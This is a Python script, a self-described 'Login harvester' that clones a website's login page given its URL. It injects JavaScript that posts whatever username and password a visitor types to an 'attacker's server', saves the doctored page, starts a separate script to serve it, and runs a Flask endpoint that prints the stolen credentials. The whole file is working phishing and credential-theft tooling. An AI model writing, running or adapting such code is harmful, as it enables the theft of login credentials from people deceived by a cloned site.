import requests
import os
import subprocess
import argparse
from bs4 import BeautifulSoup
from flask import Flask, send_file
from flask import Flask, request

parser = argparse.ArgumentParser(description='Login harvester')

#Program switches
parser.add_argument('-u', '--url', metavar='', type=str, required=True, help="Login to clone")

#Parse arguments
args = parser.parse_args()

# URL of the website to clone
url = args.url

# specify the URL of the attacker's server to send the captured credentials
attacker_url = 'http://127.0.0.1:5000'

# Make a request to the website
response = requests.get(url)

# Parse the HTML content of the website
soup = BeautifulSoup(response.content, "html.parser")

# find the login form element on the page
login_form = soup.find('form')
if login_form is None:
    print('Error: no login form found')
    exit()

# find the username and password input fields in the form
username_field = login_form.find('input', {'name': ['username', 'user', 'email', 'email_address']})
password_field = login_form.find('input', {'name': ['password', 'pass', 'secret']})
if username_field is None or password_field is None:
    print('Error: username or password field not found')
    exit()

# create the JavaScript code for capturing form data
js_code = '''
<script>
function captureFormData() {
    var username = document.getElementsByName('%s')[0].value;
    var password = document.getElementsByName('%s')[0].value;

    // create an HTTP request to send the captured credentials to the attacker's server
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '%s', true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));

    return false;
}

document.querySelector('form').addEventListener('submit', function() {
    captureFormData();
});
</script>
''' % (username_field['name'], password_field['name'], attacker_url)

# insert the JavaScript code into the login form element
login_form.insert_after(BeautifulSoup(js_code, 'html.parser'))

# save the modified HTML code to a new file
modified_file_path = 'Website.html'
with open(modified_file_path, 'w', encoding="utf-8") as f:
    f.write(str(soup))

print('JavaScript code injected into login form. Modified file saved to', modified_file_path)

print(f'The URL for the credential harvesting website is http://127.0.0.1:8080 and the handler is {attacker_url}')

# Open a new command prompt window and run the Flask app in it
subprocess.Popen(['start', 'cmd', '/k', f'Run_Website.py'], shell=True)

app = Flask(__name__)

@app.route('/', methods=['POST'])
def handle_credentials():
    username = request.form.get('username')
    password = request.form.get('password')
    
    print(f"Received credentials: {username}:{password}")
    
    return 'OK'

if __name__ == '__main__':
    app.run(debug=True)